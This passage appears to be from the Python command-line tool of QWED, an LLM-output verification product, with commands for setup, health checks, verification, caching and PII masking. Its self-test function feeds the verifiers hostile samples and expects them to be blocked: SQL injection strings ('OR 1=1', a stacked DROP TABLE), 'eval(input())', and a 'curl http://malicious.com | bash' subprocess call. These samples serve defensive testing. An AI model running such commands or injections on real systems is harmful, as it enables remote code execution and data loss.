        logger.exception("Local server target validation failed")
        click.echo(f"  [x] Invalid server URL: {exc}", err=True)
        sys.exit(1)
    except Exception as exc:
        logger.exception("Failed to start local server")
        click.echo(f"  [x] Failed to start local server: {type(exc).__name__}", err=True)
        click.echo("    Ensure dependencies are installed and runtime permissions allow subprocess start.", err=True)
        sys.exit(1)
    if not server_ready:
        click.echo("  [x] Failed to start local server.", err=True)
        click.echo("    Ensure dependencies are installed and `src/` is available in PYTHONPATH.", err=True)
        click.echo(f"    Suggested fix: pip install -e \"{_project_root()}\"", err=True)
        sys.exit(1)
    click.echo("  [ok] Local server initialized")
    if started_new:
        click.echo("  [ok] Runtime path guard applied (src/ added to PYTHONPATH)")

    try:
        qwed_api_key, actual_org_name = _bootstrap_api_key(normalized_server_url, organization_name)
    except Exception as exc:
        logger.exception("API key bootstrap failed")
        click.echo(f"  [x] API key bootstrap failed: {exc}", err=True)
        sys.exit(1)

    click.echo("  [ok] Organization created")
    if actual_org_name != organization_name:
        click.echo(f"  [ok] Organization alias used: {actual_org_name}")

    click.echo(f"\n  Your API key: {qwed_api_key}")
    click.echo("  Warning: Save this key. It is shown only once.")

    click.echo(f"\n{SEPARATOR}")
    click.echo("QWED is ready.")
    verify_url = f"{normalized_server_url.rstrip('/')}/verify/math"
    click.echo("\nVerify an output:")
    click.echo(f"  curl -X POST {verify_url} \\")
    click.echo(f"    -H \"x-api-key: {qwed_api_key}\" \\")
    click.echo("    -H \"Content-Type: application/json\" \\")
    click.echo("    -d '{\"expression\": \"2+2=4\"}'")
    click.echo("\nDocumentation: https://docs.qwedai.com")
    click.echo(SEPARATOR)
    click.echo(f"\nEnvironment file: {env_path}")


def _optional_engine_report() -> list[dict]:
    report: list[dict] = []
    optional = [
        ("OpenCV", "cv2", "image verification", "pip install qwed[vision]"),
    ]

    for label, module_name, detail, install_hint in optional:
        try:
            module = __import__(module_name)
            version = str(getattr(module, "__version__", "built-in"))
            report.append(
                {
                    "name": label,
                    "ready": True,
                    "detail": detail,
                    "install_hint": install_hint,
                    "version": version,
                }
            )
        except Exception:
            report.append(
                {
                    "name": label,
                    "ready": False,
                    "detail": detail,
                    "install_hint": install_hint,
                    "version": None,
                }
            )

    return report


def _provider_connection_profile(active_provider: str) -> dict:
    profiles = {
        "openai": {
            "label": "OpenAI",
            "connection_slug": "openai",
            "key_env": "OPENAI_API_KEY",
            "model_env": "OPENAI_MODEL",
            "base_url_env": None,
            "default_base_url": None,
        },
        "openai_direct": {
            "label": "OpenAI",
            "connection_slug": "openai",
            "key_env": "OPENAI_API_KEY",
            "model_env": "OPENAI_MODEL",
            "base_url_env": None,
            "default_base_url": None,
        },
        "anthropic": {
            "label": ANTHROPIC_CLAUDE_LABEL,
            "connection_slug": "anthropic",
            "key_env": "ANTHROPIC_API_KEY",
            "model_env": "ANTHROPIC_MODEL",
            "base_url_env": None,
            "default_base_url": None,
        },
        "claude_opus": {
            "label": ANTHROPIC_CLAUDE_LABEL,
            "connection_slug": "anthropic",
            "key_env": "ANTHROPIC_API_KEY",
            "model_env": "ANTHROPIC_MODEL",
            "base_url_env": None,
            "default_base_url": None,
        },
        "gemini": {
            "label": "Google Gemini",
            "connection_slug": "gemini",
            "key_env": "GOOGLE_API_KEY",
            "model_env": "GEMINI_MODEL",
            "base_url_env": None,
            "default_base_url": None,
        },
        "openai_compat": {
            "label": "OpenAI-compatible",
            "connection_slug": "openai-compatible",
            "key_env": "CUSTOM_API_KEY",
            "model_env": "CUSTOM_MODEL",
            "base_url_env": "CUSTOM_BASE_URL",
            "default_base_url": None,
        },
        "azure_openai": {
            "label": "Azure OpenAI",
            "connection_slug": "openai-compatible",
            "key_env": "AZURE_OPENAI_API_KEY",
            "model_env": "AZURE_OPENAI_DEPLOYMENT",
            "base_url_env": "AZURE_OPENAI_ENDPOINT",
            "default_base_url": None,
        },
        "ollama": {
            "label": "Ollama",
            "connection_slug": "ollama",
            "key_env": None,
            "model_env": "OLLAMA_MODEL",
            "base_url_env": "OLLAMA_BASE_URL",
            "default_base_url": OLLAMA_DEFAULT_BASE_URL,
        },
    }
    return profiles.get(active_provider, {})


def _normalized_active_provider_key() -> str:
    active_provider = os.getenv("ACTIVE_PROVIDER", "ollama").strip().lower().replace("-", "_")
    if active_provider == "openai_compatible":
        return "openai_compat"
    return active_provider


def _resolve_provider_env_values(profile: dict) -> tuple[str, str, str]:
    api_key = os.getenv(profile["key_env"], "").strip() if profile["key_env"] else ""
    base_url = os.getenv(profile["base_url_env"], "").strip() if profile["base_url_env"] else ""
    model = os.getenv(profile["model_env"], "").strip() if profile["model_env"] else ""
    if not base_url:
        base_url = str(profile.get("default_base_url") or "").strip()
    return api_key, base_url, model


def _missing_provider_requirement(profile: dict, api_key: str, base_url: str) -> Optional[str]:
    if profile["key_env"] and not api_key:
        return f"Missing {profile['key_env']}."
    if profile["base_url_env"] and not base_url:
        return f"Missing {profile['base_url_env']}."
    return None


def _probe_provider_connection(profile: dict, api_key: str, base_url: str, model: str) -> tuple[bool, str]:
    if profile["connection_slug"] == "gemini":
        return _test_gemini_connection(api_key)

    from qwed_new.providers.key_validator import test_connection

    return test_connection(
        provider_slug=profile["connection_slug"],
        api_key=api_key or "",
        base_url=base_url or None,
        model=model or None,
    )


def _active_provider_status() -> dict:
    _load_dotenv_if_available()
    active_provider = _normalized_active_provider_key()

    if active_provider == "auto":
        return {
            "ok": False,
            "label": "AUTO",
            "message": "Auto mode selected; run a live verify call to validate routing.",
        }

    profile = _provider_connection_profile(active_provider)
    if not profile:
        return {
            "ok": False,
            "label": active_provider or "unknown",
            "message": f"Unsupported provider '{active_provider or 'unknown'}'.",
        }

    api_key, base_url, model = _resolve_provider_env_values(profile)

    missing_message = _missing_provider_requirement(profile, api_key, base_url)
    if missing_message:
        return {
            "ok": False,
            "label": profile["label"],
            "message": missing_message,
        }

    try:
        ok, message = _probe_provider_connection(profile, api_key, base_url, model)
    except Exception as exc:
        return {
            "ok": False,
            "label": profile["label"],
            "message": f"Connection check failed: {type(exc).__name__}",
        }

    return {"ok": bool(ok), "label": profile["label"], "message": message}


def _database_url_components(*, prefer_env: bool = False) -> tuple[str, Any, str]:
    db_url = ""
    if prefer_env:
        db_url = os.getenv("DATABASE_URL", "").strip()
    if not db_url:
        from qwed_new.config import settings

        db_url = str(getattr(settings, "DATABASE_URL", DEFAULT_DATABASE_URL))
    parsed = urlparse(db_url)
    base_scheme = parsed.scheme.split("+")[0] if parsed.scheme else ""
    return db_url, parsed, base_scheme


def _sqlite_database_health(db_url: str, parsed: Any, base_scheme: str) -> Optional[dict]:
    if not (db_url.startswith(SQLITE_URL_PREFIX) or base_scheme == "sqlite"):
        return None

    db_path = (
        db_url.replace(SQLITE_URL_PREFIX, "", 1)
        if db_url.startswith(SQLITE_URL_PREFIX)
        else parsed.path.lstrip("/")
    )
    if db_path == ":memory:":
        return {"healthy": True, "location": SQLITE_MEMORY_URL}

    path = Path(db_path)
    if not path.is_absolute():
        path = (Path.cwd() / path).resolve()
    return {"healthy": path.exists(), "location": str(path)}


def _redacted_database_location(parsed: Any, base_scheme: str) -> str:
    return (
        f"{base_scheme}://{parsed.hostname or '<missing-host>'}"
        f"{f':{parsed.port}' if parsed.port else ''}{parsed.path or ''}"
    )


def _default_database_port(base_scheme: str) -> Optional[int]:
    default_ports = {"postgresql": 5432, "mysql": 3306, "mariadb": 3306, "redis": 6379}
    return default_ports.get(base_scheme)


def _probe_database_socket(hostname: str, port: int, base_scheme: str, path: str, redacted_location: str) -> dict:
    try:
        with socket.create_connection((hostname, int(port)), timeout=2.0):
            return {"healthy": True, "location": f"{base_scheme}://{hostname}:{int(port)}{path or ''}"}
    except OSError as exc:
        return {
            "healthy": False,
            "location": redacted_location,
            "error": f"{type(exc).__name__}",
        }


def _database_health(*, prefer_env: bool = False) -> dict:
    try:
        db_url, parsed, base_scheme = _database_url_components(prefer_env=prefer_env)
        sqlite_health = _sqlite_database_health(db_url, parsed, base_scheme)
        if sqlite_health is not None:
            return sqlite_health

        redacted_location = _redacted_database_location(parsed, base_scheme)
        if not parsed.hostname:
            return {"healthy": False, "location": redacted_location, "error": "Missing hostname"}

        port = parsed.port or _default_database_port(base_scheme)
        if not port:
            return {"healthy": False, "location": redacted_location, "error": "Missing port"}

        return _probe_database_socket(parsed.hostname, int(port), base_scheme, parsed.path, redacted_location)
    except Exception as exc:
        return {"healthy": False, "location": f"unavailable ({type(exc).__name__})"}


def _doctor_server_url() -> str:
    raw_server_url = os.getenv("QWED_SERVER_URL", LOCAL_SERVER_HOSTPORT).strip()
    if not raw_server_url:
        raw_server_url = LOCAL_SERVER_HOSTPORT
    if "://" not in raw_server_url:
        parsed = urlparse(f"//{raw_server_url}")
        host = (parsed.hostname or "").lower()
        scheme = LOCAL_SERVER_SCHEME if host in {"localhost", "127.0.0.1", "::1"} else REMOTE_SERVER_SCHEME
        return f"{scheme}://{raw_server_url}"
    return raw_server_url


def _doctor_report() -> dict:
    _load_dotenv_if_available(override=True)
    required_ok, required_engines = _required_engine_report()
    optional_engines = _optional_engine_report()
    provider = _active_provider_status()
    db = _database_health(prefer_env=True)

    server_url = _doctor_server_url()
    server_running = _check_server_health(server_url)

    optional_missing = sum(1 for item in optional_engines if not item["ready"])
    is_operational = required_ok and provider["ok"] and server_running and db["healthy"]

    status = "OPERATIONAL" if is_operational else "DEGRADED"

    return {
        "status": status,
        "optional_missing_count": optional_missing,
        "engines": required_engines + optional_engines,
        "required_engines": required_engines,
        "optional_engines": optional_engines,
        "provider": provider,
        "server": {"running": server_running, "url": server_url},
        "database": db,
    }


def _print_doctor_report(report: dict) -> None:
    click.echo("[QWED] System Health Check\n")
    click.echo("Engines:")
    for item in report["required_engines"] + report["optional_engines"]:
        if item["ready"]:
            click.echo(
                f"  [ok] {item['name']:<8} {(item.get('version') or '-')!s: <8} {item['detail']}"
            )
        else:
            click.echo(
                f"  [x]  {item['name']:<8} missing  {item['detail']}"
            )
            click.echo(f"    -> {item['install_hint']}")

    click.echo("\nProvider:")
    provider = report["provider"]
    marker = "[ok]" if provider["ok"] else "[x]"
    click.echo(f"  {marker} {provider['label']} - {provider['message']}")

    click.echo("\nServer:")
    server = report["server"]
    server_marker = "[ok]" if server["running"] else "[x]"
    server_msg = f"Running on {server['url']}" if server["running"] else f"Not reachable at {server['url']}"
    click.echo(f"  {server_marker} {server_msg}")

    click.echo("\nDatabase:")
    database = report["database"]
    db_marker = "[ok]" if database["healthy"] else "[x]"
    db_msg = f"{database['location']} (healthy)" if database["healthy"] else f"{database['location']} (unhealthy)"
    click.echo(f"  {db_marker} {db_msg}")

    status_line = report["status"]
    optional_missing = int(report.get("optional_missing_count", 0))
    if status_line == "OPERATIONAL" and optional_missing > 0:
        suffix = "engine" if optional_missing == 1 else "engines"
        status_line = f"{status_line} ({optional_missing} optional {suffix} missing)"
    click.echo(f"\nStatus: {status_line}")


def _run_full_engine_tests() -> List[dict]:
    results: List[dict] = []

    def add_result(group: str, label: str, passed: bool, result: str, detail: str = "") -> None:
        results.append(
            {
                "group": group,
                "label": label,
                "passed": passed,
                "result": result,
                "detail": detail,
            }
        )

    def add_engine_error_cases(group: str, labels: list[str], error: Exception) -> None:
        error_detail = f"{type(error).__name__}: {error}"
        for label in labels:
            add_result(group, label, False, "ERROR", detail=error_detail)

    def run_case(
        group: str,
        label: str,
        success_result: str,
        runner,
        pass_check,
        detail_builder,
    ) -> None:
        try:
            payload = runner()
            passed = bool(pass_check(payload))
            detail = detail_builder(payload)
            add_result(group, label, passed, success_result if passed else "BLOCKED", detail=detail)
        except Exception as exc:
            add_result(group, label, False, "ERROR", detail=f"{type(exc).__name__}: {exc}")

    try:
        from qwed_new.core.verifier import VerificationEngine

        math_engine = VerificationEngine()
    except Exception as exc:
        math_engine = None
        add_engine_error_cases("Math", [MATH_LABEL_VALID, MATH_LABEL_INVALID, MATH_LABEL_LARGE], exc)

    if math_engine is not None:
        run_case(
            "Math",
            MATH_LABEL_VALID,
            "VALID",
            lambda: math_engine.verify_math("2+2", 4),
            lambda payload: payload.get("status") == "VERIFIED",
            lambda payload: f"computed={payload.get('calculated_value')}",
        )
        run_case(
            "Math",
            MATH_LABEL_INVALID,
            "BLOCKED",
            lambda: math_engine.verify_math("2+2", 5),
            lambda payload: payload.get("status") == "CORRECTION_NEEDED",
            lambda payload: f"computed={payload.get('calculated_value')}",
        )
        run_case(
            "Math",
            MATH_LABEL_LARGE,
            "994010994 (verified)",
            lambda: math_engine.verify_math(MATH_LABEL_LARGE, 994010994),
            lambda payload: payload.get("status") == "VERIFIED",
            lambda payload: f"status={payload.get('status')}",
        )

    try:
        from qwed_new.core.logic_verifier import LogicVerifier

        logic_engine = LogicVerifier()
    except Exception as exc:
        logic_engine = None
        add_engine_error_cases("Logic", [LOGIC_LABEL_UNSAT, "x>3 AND x<10", "approval=1 AND approval=0"], exc)

    if logic_engine is not None:
        run_case(
            "Logic",
            LOGIC_LABEL_UNSAT,
            "UNSAT (contradiction)",
            lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"]),
            lambda payload: payload.status == "UNSAT",
            lambda payload: f"status={payload.status}",
        )
        run_case(
            "Logic",
            "x>3 AND x<10",
            "SAT {x=4}",
            lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 3", "x < 10", "x == 4"]),
            lambda payload: payload.status == "SAT",
            lambda payload: f"model={payload.model}",
        )
        run_case(
            "Logic",
            "approval=1 AND approval=0",
            "UNSAT (contradiction)",
            lambda: logic_engine.verify_logic({"approval": "Int"}, ["approval == 1", "approval == 0"]),
            lambda payload: payload.status == "UNSAT",
            lambda payload: f"status={payload.status}",
        )

    try:
        from qwed_new.core.sql_verifier import SQLVerifier

        sql_engine = SQLVerifier()
    except Exception as exc:
        sql_engine = None
        add_engine_error_cases("SQL", ["Valid SELECT", "OR 1=1 injection", "DROP TABLE stacked"], exc)

    if sql_engine is not None:
        run_case(
            "SQL",
            "Valid SELECT",
            "SAFE",
            lambda: sql_engine.verify_sql("SELECT id, name FROM users WHERE id = 123"),
            lambda payload: payload.get("status") == "SAFE",
            lambda payload: f"status={payload.get('status')}",
        )
        run_case(
            "SQL",
            "OR 1=1 injection",
            "BLOCKED",
            lambda: sql_engine.verify_sql("SELECT * FROM users WHERE id = 1 OR 1=1"),
            lambda payload: payload.get("status") == "BLOCKED",
            lambda payload: f"status={payload.get('status')}",
        )
        run_case(
            "SQL",
            "DROP TABLE stacked",
            "BLOCKED",
            lambda: sql_engine.verify_sql("SELECT * FROM users; DROP TABLE users;"),
            lambda payload: payload.get("status") == "BLOCKED",
            lambda payload: f"status={payload.get('status')}",
        )

    try:
        from qwed_new.core.code_verifier import CodeVerifier

        code_engine = CodeVerifier()
    except Exception as exc:
        code_engine = None
        add_engine_error_cases("Code", ["Safe function", "eval(input)", "curl | bash"], exc)

    if code_engine is not None:
        run_case(
            "Code",
            "Safe function",
            "SAFE",
            lambda: code_engine.verify_code("def add(a, b):\n    return a + b\n", language="python"),
            lambda payload: payload.get("status") == "SAFE",
            lambda payload: f"status={payload.get('status')}",
        )
        run_case(
            "Code",
            "eval(input)",
            "BLOCKED (CRITICAL)",
            lambda: code_engine.verify_code("eval(input())", language="python"),
            lambda payload: payload.get("status") == "BLOCKED",
            lambda payload: f"critical={payload.get('critical_count')}",
        )
        run_case(
            "Code",
            "curl | bash",
            "BLOCKED (CRITICAL)",
            lambda: code_engine.verify_code(
                'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
                language="python",
            ),
            lambda payload: payload.get("status") == "BLOCKED",
            lambda payload: f"critical={payload.get('critical_count')}",
        )

    return results


@cli.command()
@click.option("--json", "as_json", is_flag=True, help="Machine-readable output.")
def doctor(as_json: bool):
    """Run a local QWED system health check."""
    report = _doctor_report()

    if as_json:
        click.echo(json.dumps(report, indent=2))
    else:
        _print_doctor_report(report)

    if report.get("status") == "DEGRADED":
        sys.exit(1)


@cli.command(name="test")
@click.option("--verbose", is_flag=True, help="Show detailed test output.")
def test_command(verbose: bool):
    """Run deterministic verification tests for math, logic, SQL, and code engines."""
    click.echo("[QWED] Running verification test suite...")
    results = _run_full_engine_tests()

    for group in ("Math", "Logic", "SQL", "Code"):
        click.echo(f"\n{group}:")
        group_items = [item for item in results if item["group"] == group]
        for item in group_items:
            marker = "[ok]" if item["passed"] else "[x]"
            click.echo(f"  {marker} {item['label']:<22} -> {item['result']}")
            if verbose and item.get("detail"):
                click.echo(f"    {item['detail']}")

    total = len(results)
    passed = sum(1 for item in results if item["passed"])

    if passed == total:
        click.echo(f"\n{passed}/{total} tests passed. All engines operational.")
        return

    click.echo(f"\n{passed}/{total} tests passed. Review failures above.", err=True)
    sys.exit(1)


@cli.command()
@click.argument('query')
@click.option('--provider', '-p', default=None, help='LLM provider (openai/anthropic/gemini)')
@click.option('--model', '-m', default=None, help='Model name (e.g., gpt-4o-mini, llama3)')
@click.option('--base-url', default=None, help=f'Custom API endpoint (e.g., {OLLAMA_DEFAULT_BASE_URL})')
@click.option('--api-key', default=None, envvar='QWED_API_KEY', help='API key (or set QWED_API_KEY env var)')
@click.option('--no-cache', is_flag=True, help='Disable caching')
@click.option('--quiet', '-q', is_flag=True, help='Minimal output')
@click.option('--mask-pii', is_flag=True, help='Mask PII (emails, phones, etc.) before sending to LLM')
def verify(query: str, provider: Optional[str], model: Optional[str], 
           base_url: Optional[str], api_key: Optional[str], 
           no_cache: bool, quiet: bool, mask_pii: bool):
    """
    Verify a query using QWED.
    
    Examples:
        qwed verify "What is 2+2?"
        qwed verify "derivative of x^2" --provider openai
        qwed verify "5!" --base-url <ollama_base_url> --model llama3
    """
    if quiet:
        import os
        os.environ["QWED_QUIET"] = "1"
    
    # Load .env file so credentials from qwed init are available
    try:
        from dotenv import load_dotenv
        load_dotenv()
    except ImportError:
        # python-dotenv is optional; credentials can still be passed via CLI args or env
        logger.debug("python-dotenv not installed, skipping auto-load")
        if not quiet:
            err_msg = (
                f"{QWED.ERROR}WARNING: python-dotenv not installed. Run 'pip install python-dotenv' for auto-loading .env{QWED.RESET}"
                if HAS_COLOR
                else "WARNING: python-dotenv not installed. Run 'pip install python-dotenv' for auto-loading .env"
            )
            click.echo(err_msg, err=True)
    
    try:
        # Auto-detect provider/base_url from ACTIVE_PROVIDER
        if not provider and not base_url:
            import os as _os
            active = _os.getenv("ACTIVE_PROVIDER", "").strip()
            if active == "ollama" or not active:
                # Use Ollama (LOCAL): respect user-configured env vars
                base_url = _os.getenv("OLLAMA_BASE_URL", OLLAMA_DEFAULT_BASE_URL)
                model = model or _os.getenv("OLLAMA_MODEL", "llama3")
                if HAS_COLOR and not quiet:
                    click.echo(f"{QWED.INFO}\u2139\ufe0f  Using Ollama at {base_url}{QWED.RESET}")
            elif active == "openai-compatible" or active == "openai_compat":
                base_url = _os.getenv("CUSTOM_BASE_URL", "")
                if not base_url:
                    err_msg = (
                        f"{QWED.ERROR}ERROR: CUSTOM_BASE_URL is required for openai-compatible provider{QWED.RESET}"
                        if HAS_COLOR
                        else "ERROR: CUSTOM_BASE_URL is required for openai-compatible provider"
                    )
                    click.echo(err_msg, err=True)
                    click.echo("Set CUSTOM_BASE_URL env var or run: qwed init", err=True)
                    sys.exit(1)
                api_key = api_key or _os.getenv("CUSTOM_API_KEY", "")
                model = model or _os.getenv("CUSTOM_MODEL", "gpt-4o-mini")
                if HAS_COLOR and not quiet:
                    click.echo(f"{QWED.INFO}\u2139\ufe0f  Using configured provider: {active}{QWED.RESET}")
            else:
                # Named provider (openai, anthropic, etc.)
                provider = active
                provider_key_env = {
                    "openai": "OPENAI_API_KEY",
                    "anthropic": "ANTHROPIC_API_KEY",
                    "gemini": "GOOGLE_API_KEY",
                }
                provider_model_env = {
                    "openai": "OPENAI_MODEL",
                    "anthropic": "ANTHROPIC_MODEL",
                    "gemini": "GEMINI_MODEL",
                }
                if not api_key:
                    env_key = provider_key_env.get(provider, "QWED_API_KEY")
                    api_key = _os.getenv(env_key, _os.getenv("QWED_API_KEY", ""))
                if not model:
                    model_env = provider_model_env.get(provider, "")
                    model = _os.getenv(model_env, model) if model_env else model
                if HAS_COLOR and not quiet:
                    click.echo(f"{QWED.INFO}INFO: Using configured provider: {active}{QWED.RESET}")
        
        # Create client
        if base_url:
            client = QWEDLocal(
                base_url=base_url,
                model=model or "llama3",
                api_key=api_key or None,
                cache=not no_cache,
                mask_pii=mask_pii
            )
        elif provider:
            if not api_key:
                click.echo(f"{QWED.ERROR}ERROR: API key required for {provider}{QWED.RESET}", err=True)
                click.echo("Set QWED_API_KEY env var or use --api-key", err=True)
                sys.exit(1)
            
            client = QWEDLocal(
                provider=provider,
                api_key=api_key,
                model=model or "gpt-3.5-turbo",
                cache=not no_cache,
                mask_pii=mask_pii
            )
        else:
            click.echo("Error: Specify either --provider or --base-url", err=True)
            sys.exit(1)
        
        # Verify!
        result = client.verify(query)
        
        # Show result (if not already shown by branded output)
        if quiet or not HAS_COLOR:
            if result.verified:
                click.echo(f"VERIFIED: {result.value}")
            else:
                click.echo(f"ERROR: {result.error or 'Verification failed'}", err=True)
        
        if not result.verified:
            sys.exit(1)
    
    except Exception as e:
        click.echo(f"{QWED.ERROR if HAS_COLOR else ''}Error: {e!s}{QWED.RESET if HAS_COLOR else ''}", err=True)
        sys.exit(1)


@cli.group()
def cache():
    """Manage verification cache."""
    pass


@cache.command('stats')
def cache_stats():
    """Show cache statistics."""
    try:
        from qwed_sdk.cache import VerificationCache
        cache_obj = VerificationCache()
        cache_obj.print_stats()
    except Exception as e:
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cache.command('clear')
@click.confirmation_option(prompt='Are you sure you want to clear the cache?')
def cache_clear():
    """Clear all cached verifications."""
    try:
        from qwed_sdk.cache import VerificationCache
        cache_obj = VerificationCache()
        cache_obj.clear()
        click.echo(f"{QWED.SUCCESS if HAS_COLOR else ''}Cache cleared!{QWED.RESET if HAS_COLOR else ''}")
    except Exception as e:
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.command()
@click.option('--provider', '-p', default=None, help='Default provider')
@click.option('--model', '-m', default=None, help='Default model')
def interactive(provider: Optional[str], model: Optional[str]):
    """
    Start interactive verification session.
    
    Example:
        qwed interactive
        > What is 2+2?
        VERIFIED -> 4
        > derivative of x^2
        VERIFIED -> 2*x
    """
    if HAS_COLOR:
        click.echo(f"\n{QWED.BRAND}QWED Interactive Mode{QWED.RESET}")
        click.echo(f"{QWED.INFO}Type 'exit' or 'quit' to quit{QWED.RESET}\n")
    else:
        click.echo("\nQWED Interactive Mode")
        click.echo("Type 'exit' or 'quit' to quit\n")
    
    # Create client once
    try:
        if provider:
            api_key = click.prompt("API Key", hide_input=True)
            client = QWEDLocal(
                provider=provider,
                api_key=api_key,
                model=model or "gpt-3.5-turbo"
            )
        else:
            # Default to Ollama
            client = QWEDLocal(
                base_url=OLLAMA_DEFAULT_BASE_URL,
                model=model or "llama3"
            )
    except Exception as e:
        click.echo(f"Error initializing client: {e}", err=True)
        sys.exit(1)
    
    # Interactive loop
    while True:
        try:
            query = click.prompt(f"{QWED.BRAND if HAS_COLOR else ''}>{QWED.RESET if HAS_COLOR else ''}", 
                               prompt_suffix=" ")
            
            if query.lower() in ['exit', 'quit', 'q']:
                break
            
            if query.strip() == '':
                continue
            
            # Special commands
            if query.lower() == 'stats':
                client.print_cache_stats()
                continue
            
            # Verify
            result = client.verify(query)
            
            # Result already shown by branded output
            if not HAS_COLOR:
                if result.verified:
                    click.echo(f"VERIFIED: {result.value}")
                else:
                    click.echo(f"ERROR: {result.error or 'Failed'}")
            
            click.echo()  # Blank line
            
        except KeyboardInterrupt:
            click.echo("\n\nGoodbye!")
            break
        except EOFError:
            break
        except Exception as e:
            click.echo(f"Error: {e}", err=True)
    
    # Show final stats
    if HAS_COLOR:
        click.echo(f"\n{QWED.BRAND}Session Stats:{QWED.RESET}")
    client.print_cache_stats()


@cli.command()
@click.argument('text')
def pii(text: str):
    """
    Test PII detection on text (requires qwed[pii]).
    
    Examples:
        qwed pii "My email is john@example.com"
        qwed pii "Card: 4532-1234-5678-9010"
    """
    try:
        from qwed_sdk.pii_detector import PIIDetector
        
        detector = PIIDetector()
        masked, info = detector.detect_and_mask(text)
        
        # Show results
        if HAS_COLOR:
            click.echo(f"\n{QWED.INFO}Original:{QWED.RESET} {text}")
            click.echo(f"{QWED.SUCCESS}Masked:{QWED.RESET}   {masked}")
            click.echo(f"\n{QWED.VALUE}Detected: {info['pii_detected']} entities{QWED.RESET}")
        
        else:
            click.echo(f"\nOriginal: {text}")
            click.echo(f"Masked:   {masked}")
            click.echo(f"\nDetected: {info['pii_detected']} entities")
        
        # Show types
        if info['pii_detected'] > 0:
            for entity_type in set(info.get('types', [])):
                count = info['types'].count(entity_type)
                click.echo(f"  - {entity_type}: {count}")
        
    except ImportError:
        click.echo(f"{QWED.ERROR if HAS_COLOR else ''}ERROR: PII features not installed{QWED.RESET if HAS_COLOR else ''}", err=True)
        click.echo("\nInstall with:", err=True)
        click.echo("   pip install 'qwed[pii]'", err=True)
        click.echo("   python -m spacy download en_core_web_lg", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.group()
def provider():
    """Manage dynamic LLM providers."""
    pass


@provider.command(name="import")
@click.argument("url")
def import_provider(url: str):
    """Import a custom provider from a YAML URL."""
    try:
        from qwed_new.providers.config_manager import ProviderConfigManager
    except ImportError:
        click.echo(f"{QWED.ERROR if HAS_COLOR else ''}ERROR: Core config manager not found{QWED.RESET if HAS_COLOR else ''}", err=True)
        sys.exit(1)
        
    try:
        if HAS_COLOR:
            click.echo(f"{QWED.INFO}\u2139\ufe0f  Downloading provider from {url}...{QWED.RESET}")
        else:
            click.echo(f"\u2139\ufe0f  Downloading provider from {url}...")
            
        manager = ProviderConfigManager()
        slug = manager.import_provider_from_url(url)
        
        if HAS_COLOR:
            click.echo(f"{QWED.SUCCESS}Successfully imported provider '{slug}'!{QWED.RESET}")
            click.echo(f"{QWED.INFO}   You can now run 'qwed init' and select it from the interactive menu.{QWED.RESET}")
        else:
            click.echo(f"Successfully imported provider '{slug}'!")
            click.echo("   You can now run 'qwed init' and select it from the interactive menu.")
    except Exception as e:
        if HAS_COLOR:
            click.echo(f"{QWED.ERROR}Failed to import provider: {str(e)}{QWED.RESET}", err=True)
        else:
            click.echo(f"Failed to import provider: {str(e)}", err=True)
        sys.exit(1)


if __name__ == '__main__':
    cli()
